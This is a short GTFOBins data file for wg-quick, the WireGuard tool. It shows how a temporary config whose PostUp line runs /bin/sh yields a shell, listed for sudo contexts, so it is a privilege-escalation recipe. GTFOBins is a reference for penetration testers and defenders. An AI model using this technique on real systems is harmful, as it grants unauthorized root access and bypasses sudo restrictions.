<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/wg-quick -->
---
functions:
  shell:
  - code: |-
      cat >/path/to/temp-file.conf <<EOF
      [Interface]
      PostUp = /bin/sh
      EOF

      wg-quick up /path/to/temp-file.conf
    comment: |-
      Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.
    contexts:
      sudo:
...
